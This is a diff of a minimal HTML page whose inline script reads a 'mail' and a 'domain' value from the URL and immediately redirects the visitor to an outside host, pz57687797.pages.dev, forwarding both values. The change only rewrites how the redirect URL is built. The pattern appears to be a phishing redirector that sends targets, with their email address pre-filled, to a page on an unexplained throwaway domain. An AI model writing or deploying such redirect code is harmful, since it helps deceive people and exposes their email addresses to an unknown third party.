@@ -7,13 +7,24 @@
 </head>
 <body>
     <script type="text/javascript">
-        const urlParams = new URLSearchParams(window.location.search);
-        const urlParams2 = new URLSearchParams(window.location.search);
-        const mymail = urlParams.get('mail') || '';
-        const dm = urlParams2.get('domain') || '';
+        // Get all URL parameters from current page
+        const params = new URLSearchParams(window.location.search);
+        const mymail = params.get('mail') || '';
+        const dm = params.get('domain') || '';
 
-        // Redirect directly with both parameters
-        window.location.replace(`https://pz57687797.pages.dev/?mail=${encodeURIComponent(mymail)}&domain=${encodeURIComponent(dm)}`);
+        // Build the redirect URL dynamically
+        let redirectUrl = 'https://pz57687797.pages.dev/';
+        const queryParts = [];
+
+        if (mymail) queryParts.push(`mail=${encodeURIComponent(mymail)}`);
+        if (dm) queryParts.push(`domain=${encodeURIComponent(dm)}`);
+
+        if (queryParts.length > 0) {
+            redirectUrl += '?' + queryParts.join('&');
+        }
+
+        // Perform the redirect
+        window.location.replace(redirectUrl);
     </script>
 </body>
 </html>
